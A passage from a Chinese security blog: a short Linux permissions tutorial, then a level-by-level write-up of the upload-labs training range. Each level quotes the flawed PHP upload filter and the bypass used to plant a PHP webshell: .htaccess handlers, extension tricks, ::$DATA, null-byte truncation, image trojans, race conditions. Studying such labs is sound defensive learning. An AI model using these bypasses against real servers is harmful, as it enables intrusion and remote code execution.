接下来的字符，以三个为一组，且均为[rwx]的三个参数的组合，其中[r]代表可读（read），[w]代表可写（write），[x]代表可执行（execute），如果没有权限则会出现减号[-]。第一组代表文件拥有者可具备的权限，第二组代表加入此用户组之账号的权限，第三组代表非本人且没有加入本用户组的其他账号的权限 十个字符整理如下： 1-rwxr-xr-- 意义是这是一个文件，文件拥有者具有可读，可写和可执行的权限。同用户组的用户具有可读和可执行的权限，其他用户具有只读的权限 第二栏：链接数每个文件都会讲它的权限与属性记录到文件系统的inode中，这个属性记录的就是有多少不同的文件名链接到同一个inode中 第三栏：文件的拥有者第四栏：文件所属的用户组在Linux系统中，你的账号会加入一个或多个用户组中，假如用户组具有可读可写权限，则该用户组中的每个用户都具有可读可写权限 第五栏：文件大小默认单位为Bytes 第六栏：文件创建日期或最后被修改的日期第七栏：文件名2.修改文件属性与权限chgrp：修改文件所属用户组 chown：修改文件拥有者 chmod：修改文件权限 修改所属用户组使用chgrp命令，前提是修改的用户组必须在/etc/group文件中存在才行，命令格式如下： 12root@ubuntu:~# chgrp groupname dirname/filenameroot@ubuntu:~# chgrp test .config 修改文件拥有者使用chown命令，前提修改的用户必须在/etc/passwd文件中存在才行，命令格式如下： 1234root@ubuntu:~# chown 账号名称 文件或目录root@ubuntu:~# chown 账号名称：用户组名称 文件或目录root@ubuntu:~# chown test01 .configroot@ubuntu:~# chown test01:test .config 修改文件权限使用chmod命令，设置方法有两种，分别可以用数字或是符号来进行权限的修改 数字类型修改文件权限各权限的数字对照表如下： 123r：4w：2x：1 每种身份（owner，group，others）各自的三个权限（r，m，x）数字是需要累加的，例如当权限为：[-rwxrwx---]数字则是： 123owner = rwx = 4+2+1 = 7group = rwx = 4+2+1 = 7others = --- = 0+0+0 = 0 所以我们设置权限时，该文件的权限数字就是770，chmod语法如下： 12root@ubuntu:~# chmod xyz 文件或目录root@ubuntu:~# chmod 777 .config 符号类型修改文件权限格式如下： 1root@ubuntu:~# chmod 身份 权限操作 权限 文件或目录 参数具体为： （1）身份：u即user，g即用户组，o即其他人，a代表全部身份 （2）权限操作：+即加入，-即移除，=即设置 （3）权限：rmx 例子如下： 1root@ubuntu:~# chmod u=rwx,go=rx .config 3.目录与文件的权限意义权限对文件的意义r（read）：可读取此文件的实际内容 w（write）：可以编辑，新增或是修改该文件的内容（但不含删除该文件） x（execute）：该文件具有可以被系统执行的权限 权限对目录的意义r（read）：表示具有读取目录结构列表的权限，如使用ls命令将该目录的内容列表显示出来 w（write）：具有改动该目录结构列表的权限 x（execute）：用户具有进入该目录的权限，如使用cd命令进入某个目录列表","categories":[{"name":"Linux","slug":"Linux","permalink":"https://Foxgrin.github.io/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://Foxgrin.github.io/tags/Linux/"}]},{"title":"文件上传漏洞--upload-labs","slug":"upload-labs","date":"2019-03-02T14:05:00.000Z","updated":"2019-03-05T12:03:57.574Z","comments":true,"path":"/posts/49857/","link":"","permalink":"https://Foxgrin.github.io/posts/49857/","excerpt":"文件上传练习靶场–upload-labs通关记录以及对文件上传漏洞的总结","text":"文件上传练习靶场–upload-labs通关记录以及对文件上传漏洞的总结 Pass-01直接上传php文件，出现弹框提示上传失败 尝试抓包，但是因为弹框未抓到上传文件的包，所以猜测是前端JS代码对文件进行了检测，直接查看网页源代码，发现检测JS代码如下： 12345678910111213141516171819&lt;script type=\"text/javascript\"&gt; function checkFile() &#123; var file = document.getElementsByName('upload_file')[0].value; if (file == null || file == \"\") &#123; alert(\"请选择要上传的文件!\"); return false; &#125; //定义允许上传的文件类型 var allow_ext = \".jpg|.png|.gif\"; //提取上传文件的类型 var ext_name = file.substring(file.lastIndexOf(\".\")); //判断上传文件类型是否允许上传 if (allow_ext.indexOf(ext_name) == -1) &#123; var errMsg = \"该文件不允许上传，请上传\" + allow_ext + \"类型的文件,当前文件类型为：\" + ext_name; alert(errMsg); return false; &#125; &#125;&lt;/script&gt; 代码大致流程是对比文件名的最后一个后缀是否是jpg,png,gif，如果不是则前端拦截文件，上传失败。 既然是前端进行，我们只要绕过前端，再利用抓包修改文件名后缀，即可成功上传PHP文件。我们先上传一个后缀名为JPG，内容为PHP代码的文件1cmd.jpg，再通过抓包修改文件名为1cmd.php，过程如下图所示 Pass-02直接上传PHP文件，提示文件类型错误，猜测后台代码对文件类型进行了检测，抓包修改文件类型为image/jpeg，如下图所示 本关检测代码如下： 1234567891011121314151617if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125; Pass-03上传PHP文件，提示禁止不允许上传.asp,.aspx,.php,.jsp后缀文件 ，尝试修改文件名为.jpg.php，修改文件类型，大写PHP，都失败，猜测后台代码将文件名的最后一个”.”后作为检测目标。后台过滤代码如下： 12345678910111213141516171819202122232425if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 过滤了后缀名为.asp,.aspx,.php,.jsp的文件，但是没有过滤phtml文件 上传成功http://127.0.0.1/upload-labs/upload/201903031949124726.phtml 另外修改后缀名为php3也可以 Pass-04上传php，phtml，php3等文件都失败，过滤代码如下： 1234567891011121314151617181920212223242526if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\"php1\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\"pHp1\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 黑名单几乎过滤掉了所有问题后缀名，但是唯独没有过滤.htaccess文件，我们上传一个.htaccess文件，内容为： 1SetHandler application/x-httpd-php 上传之后，该路径下所有文件都会被解析成PHP格式文件，我们再上传包含PHP代码的图片文件 访问http://127.0.0.1/upload-labs/upload/4cmd.jpg Pass-05跟上一关区别的是黑名单又增加了.htaccess文件，过滤代码如下： 1234567if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 但是仔细观察发现这关并没有将上传文件的后缀名通过strtolower进行大小写转化的处理，所以很简单，上传一个.PHP文件即可 Pass-061234567if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA 黑名单一样，并对文件名进行小写转化处理，但是未对文件名通过trim函数进行去空处理，所以对后缀名进行加空，即可上传成功 Pass-071234567if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 黑名单相同，对文件名进行去空和小写转换处理，但是没有通过自定义的deldot函数进行末尾去点处理，所以上传后缀名为.php.文件，windows特性上传后会自动将后缀名的点去掉 Pass-081234567if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 这关没有通过str_ireplace函数去除字符串::$DATA，在文件名后缀加上::$DATA即可绕过 Pass-912345678if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 相对于前面几关而言，这关过滤的较为完善，可以看到，过滤的流程为：（1）文件名去空（2）文件名去点（3）截取最后一个点后的字符串（4）将截取的文件后缀转换为小写（4）将截取的文件名后缀去除字符串::$DATA（5）将截取的文件名后缀去空 我们可以看一下deldot函数的具体代码： 123456789101112function deldot($s)&#123; for($i = strlen($s)-1;$i&gt;0;$i--)&#123; $c = substr($s,$i,1); if($i == strlen($s)-1 and $c != '.')&#123; return $s; &#125; if($c != '.')&#123; return substr($s,0,$i+1); &#125; &#125;&#125; 可以发现，检测流程是从文件名的最后一位开始检测，是点就去掉末位，继续向前检测，只要检测到文件名最后一位不是点，就返回过滤后的文件名，而且去点只有一次 针对上述过滤流程，我们可以构造后缀名为.php. .(点+空格+点)，经过去点过滤后的文件名为.php. （点+空格），之后截取文件名后缀自然就绕过检测，上传的文件名最后后缀为.php.（点） Pass-101234567891011121314151617if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这关是将上传文件的文件名通过str_ireplace函数去除黑名单中的文件后缀，但是这个函数的缺点是只能去除一次，所以双写就能绕过，上传文件名后缀为.pphphp Pass-1112345678910111213141516if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 这关开始采用了白名单的形式，要求上传文件名后缀名必须为jpg，png，gif，但是我们可以发现上传文件的路径是通过GET方式传递的参数save_path进行拼接的，所以在save_path末尾利用%00截断绕过 Pass-1212345678910111213141516if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传失败\"; &#125; &#125; else &#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 这关拼接的参数save_path是通过POST方式传递的，同样抓包修改save_path，但是因为POST不像GET能URL解码%00，所以我们需要在二进制中修改 Pass-1312345678910111213141516171819202122function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125; 通过读取文件的前两个字节来判断文件类型，本关的目的是上传图片马，所以利用copy命令将图片文件和php文件进行合并成图片马文件，命令如下： 1copy 1.jpg/b + 13cmd.php/a 13cmd.jpg 最后通过带有文件包含漏洞的文件检测图片马 Pass-141234567891011121314function isImage($filename)&#123; $types = '.jpeg|.png|.gif'; if(file_exists($filename))&#123; $info = getimagesize($filename); $ext = image_type_to_extension($info[2]); if(stripos($types,$ext)&gt;=0)&#123; return $ext; &#125;else&#123; return false; &#125; &#125;else&#123; return false; &#125;&#125; 利用getimagesize函数获取文件类型是否是图片文件，跟上一关一样，可以用copy命令生成图片马，也可以在文件内容的开头加入GIF89A伪装成GIF文件 Pass-15123456789101112131415161718function isImage($filename)&#123; //需要开启php_exif模块 $image_type = exif_imagetype($filename); switch ($image_type) &#123; case IMAGETYPE_GIF: return \"gif\"; break; case IMAGETYPE_JPEG: return \"jpg\"; break; case IMAGETYPE_PNG: return \"png\"; break; default: return false; break; &#125;&#125; 同样利用copy命令生成图片马或者在文件内容开头加入GIF89A即可上传图片马 Pass-161234567891011121314151617181920else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; 这关规定了文件的后缀名必须是jpg，png或gif，文件类型Content-Type必须为image/jpeg，image/png或image/gif，而且上传后还经过imagecreatefromgif函数进行图片二次渲染的过程，我们可以先试着上传一个利用copy命令生成的图片马 可以看到成功上传，接下来访问上传的图片马 可以看出上传的图片马末尾的PHP代码经过二次渲染后发生了变化 二次渲染后的图片是会有部分内容不会发生变化的，我们可以试着上传一张完整的GIF图片，对比上传后的图片与原来的图片 我们可以发现开头部分内容前后是没有变化的，那么我们就在开头部分直接添加PHP代码再上传 成功上传，再利用文件包含漏洞访问一下上传的图片马 这个方法只适合gif图片，如果是png和jpg方法较为麻烦，具体可以参考https://xz.aliyun.com/t/2657 Pass-171234567891011121314151617181920if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; &#125;else&#123; $msg = '上传出错！'; &#125;&#125; 这关先经过move_uploaded_file函数进行文件上传，再利用白名单过滤文件，如果不是图片文件再通过unlink函数将文件删除，我们可以利用条件竞争的原理，利用多线程不断上传php文件，再后台还未来得及通过unlink函数删除php文件时，访问到webshell 发包的同时在浏览器不断访问17cmd.php文件 Pass-1812345678910111213141516171819202122232425262728293031323334353637if (isset($_POST['submit']))&#123; require_once(\"./myupload.php\"); $imgFileName =time(); $u = new MyUpload($_FILES['upload_file']['name'], $_FILES['upload_file']['tmp_name'], $_FILES['upload_file']['size'],$imgFileName); $status_code = $u-&gt;upload(UPLOAD_PATH.'/'); switch ($status_code) &#123; case 1: $is_upload = true; $img_path = $u-&gt;cls_upload_dir . $u-&gt;cls_file_rename_to; break; case 2: $msg = '文件已经被上传，但没有重命名。'; break; case -1: $msg = '这个文件不能上传到服务器的临时文件存储目录。'; break; case -2: $msg = '上传失败，上传目录不可写。'; break; case -3: $msg = '上传失败，无法上传该类型文件。'; break; case -4: $msg = '上传失败，上传的文件过大。'; break; case -5: $msg = '上传失败，服务器已经存在相同名称文件。'; break; case -6: $msg = '文件无法上传，文件不能复制到目标目录。'; break; default: $msg = '未知错误！'; break; &#125;&#125; 这关同样使用了白名单的形式规定了合法的后缀名，上传后再通过rename函数重命名。我们可以观察这关的白名单中存在压缩包的后缀名 123var $cls_arr_ext_accepted = array( &quot;.doc&quot;, &quot;.xls&quot;, &quot;.txt&quot;, &quot;.pdf&quot;, &quot;.gif&quot;, &quot;.jpg&quot;, &quot;.zip&quot;, &quot;.rar&quot;, &quot;.7z&quot;,&quot;.ppt&quot;, &quot;.html&quot;, &quot;.xml&quot;, &quot;.tiff&quot;, &quot;.jpeg&quot;, &quot;.png&quot; ); 那么跟上一关一样，我们可以利用条件竞争，通过多线程发送上传后缀名为.php.7z的文件的包，当服务器还未来得及将文件改名时访问上传的webshell 可以看到有的响应包的提示是文件还来不及被重命名 在浏览器中访问18cmd.php.7z 成功访问webshell Pass-191234567891011121314151617181920212223if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = $_POST['save_name']; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125;else&#123; $msg = '上传出错！'; &#125; &#125;else&#123; $msg = '禁止保存为该类型文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125; 这关以一个POST方式传递的参数save_name作为上传文件保存的文件名，同时通过pathinfo函数对文件名的后缀名进行黑名单检测，但是我们可以发现，并没有对该参数进行一系列过滤处理（去点，去空，去::$DATA字符串，大小写转化） 我们先测试一下pathinfo函数： 12345echo pathinfo(\"cmd.php\",PATHINFO_EXTENSION); #phpecho pathinfo(\"cmd.php.\",PATHINFO_EXTENSION); #echo pathinfo('cmd.php::$DATA',PATHINFO_EXTENSION); #::$DATAecho pathinfo(\"cmd.php \",PATHINFO_EXTENSION);echo \"&lt;br&gt;\"; #phpecho pathinfo(\"cmd.PHP\",PATHINFO_EXTENSION);echo \"&lt;br&gt;\"; #PHP 通过测试说明，一系列之前关卡的绕过方法都是可以的 Pass-201234567891011121314151617181920212223242526272829if(!empty($_FILES['upload_file']))&#123; //mime check $allow_type = array('image/jpeg','image/png','image/gif'); if(!in_array($_FILES['upload_file']['type'],$allow_type))&#123; $msg = \"禁止上传该类型文件!\"; &#125;else&#123; //check filename $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name']; if (!is_array($file)) &#123; $file = explode('.', strtolower($file)); &#125; $ext = end($file); $allow_suffix = array('jpg','png','gif'); if (!in_array($ext, $allow_suffix)) &#123; $msg = \"禁止上传该后缀文件!\"; &#125;else&#123; $file_name = reset($file) . '.' . $file[count($file) - 1]; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' .$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $msg = \"文件上传成功！\"; $is_upload = true; &#125; else &#123; $msg = \"文件上传失败！\"; &#125; &#125; &#125; &#125; 这关首先检查了上传的文件类型，然后将POST方式传递的参数save_name（如果为空，则上传的文件名）作为文件名变量$file，对$file进行了是否是数组的判断，如果不是数组则以“.”为分界符打散成数组，并取出数组最后一个元素（通过end函数）作为文件名后缀进行白名单的检测，通过检测的话就取出数组的第一个元素（通过reset函数）与$file[count($file) - 1]拼接成最终的文件名上传 如果变量$file作为字符串，则我们只能上传图片马，但如果作为数组，则不需要经过explode函数的处理，那么我们就考虑对$file数组赋值如下： 1234$file = array();$file[1] = \"20cmd\";$file[2] = \"php\";$file[3] = \"jpg\"; 那么被检测的后缀名变量$ext和最后上传的文件名变量$file_name的值如下： 12$ext = end($file) == \"jpg\"$file_name = reset($file) . '.' . $file[count($file) - 1] == \"20cmd.php\" 上传的payload如下图所示 还可以考虑通过利用%00截断函数move_uploaded_file，对$file数组赋值如下： 123$file = array();$file[0] = \"20cmd.php \"; //将最后一个空格字符\" \"在burp的提交包中的十六进制中替换成0x00$file[1] = \"jpg\"; 上传的payload如下图所示 文件上传漏洞总结文件上传的检查主要分为两大部分：客户端检查和服务器端检查 一.客户端检查客户端主要是通过前端的JS代码进行检查，如果只是单纯的前端检查，我们只需要按照前端的检查标准发送请求包，再通过抓包修改请求包的内容，如第一关，抓包修改一下文件名后缀再提交即可成功上传webshell 二.服务器端检查服务器端则是通过后台脚本代码（本靶场为PHP）进行检查，检查主要分为三部分：检查Content-type，检查后缀名，检查文件内容 1.检查Content-type抓包修改Content-type字段为合法内容即可 2.检查后缀名检查后缀名分为黑名单检测和白名单检测 2.1黑名单检测列举出一系列禁止上传的文件后缀名进行过滤，常用的绕过方法有以下几种： （1）上传特殊可解析后缀：如phtml，php3，php5，pht （2）上传.htaccess文件：内容为SetHandler application/x-httpd-php ，上传的所有文件都会被当做php文件进行解析，前提是需要服务器相关配置开启 （3）大小写绕过：在Linux没有特殊配置的情况下，这种情况只有win可以，因为win会忽略大小写，例如Pass-05中未使用strtolower函数进行小写转化处理，那么将后缀名改成PHP即可上传成功 （4）空格，点绕过：Win下xx.php[空格] 或xx.php.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点 ，例如Pass-06和Pass-07未使用trim函数或者自定义的deldot函数进行去空和去点处理，就可以利用该方法进行绕过上传 （5）::$DATA绕过：NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA，例如Pass-08中，未使用str_ireplace函数去除::$DATA，那么上传后缀名为.php::$DATA即可上传 （6）双写后缀名绕过：当服务器利用函数（如Pass-10中使用str_ireplace函数）将敏感的后缀名替换为空时，双写后缀名，如.pphphp即可绕过 （7）上传.7z压缩包绕过：.7z是一种压缩包文件的格式，我们上传cmd.php.7z文件，再访问该文件时能够正常访问到php页面，这属于Apache解析漏洞，Apache解析文件时，如果后缀名不认识，则会继续想前解析，会解析到php,这就是Apache的解析漏洞 2.2白名单检测列举出只允许上传的文件后缀名，过滤掉不属于白名单中的文件，常用的绕过方法有以下几种： （1）MIME绕过：检查http包的Content-type字段来判断文件类型，直接修改该字段值即可 （2）%00截断：利用%00截断move_uploaded_file函数，只解析%00前的字符，%00后的字符不解析，通常运用在GET方式，因为GET方式传入能自动进行URL解码，如Pass-11 （3）0x00截断：原理同%00截断，只不过是通过POST方式传递参数，需要通过Burp在十六进制形式中修改 3.检查文件内容通过一些检查文件内容的函数进行判断是否是图片格式的文件，可以大致分为对文件头检查，getimagesize函数检查，exif_imagetype函数检查和二次渲染，通常我们只能够上传图片马，常用的绕过方法有以下几种：（1）利用copy命令生成图片马：命令具体为copy 1.jpg/b + cmd.php/a shell.jpg，生成图片马后上传成功，但是同时还得存在文件包含漏洞才能执行图片马 （2）利用GIF89A伪造成GIF文件：在PHP文件开头内容加入GIF89A，服务器通过getimagesize会认为这是GIF文件 （3）绕过二次渲染：上传PNG和JPG图片马方法较为复杂，但是GIF图片马只需要找到上传前后两个文件经过二次渲染未改变内容的地方，并在其中添加PHP代码即可 